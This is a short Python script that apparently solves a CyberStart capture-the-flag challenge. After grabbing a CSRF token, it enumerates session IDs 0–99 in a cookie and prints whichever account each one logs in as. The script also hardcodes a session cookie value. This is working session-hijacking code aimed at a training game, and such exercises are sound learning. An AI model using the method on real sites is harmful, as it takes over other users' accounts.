#!/usr/bin/env python3
import requests
import re
import sys

session = requests.Session()


response = session.get(
    "https://game.joincyberstart.com/base-headquarters",
    cookies={"Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp"},
)

matches = re.search(r'csrf=(.*?)"', response.text)
csrf_base = matches.group(1)


def run(id):
    print(id)
    challenge_url = f"https://game.joincyberstart.com/challenge?base=1&level=12&challenge=7&csrf={csrf_base}"

    response3 = session.post(
        challenge_url,
        cookies={
            "Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp",
            "speek_sess_id": str(id),
        },
    )

    # print(response3.text)
    # <div class="account">Logged in as gadwallsymmetry</div>
    regex = r'account">(.*?)<'

    groups = re.search(regex, response3.text).group(1)
    print(groups)


for i in range(100):
    run(i)
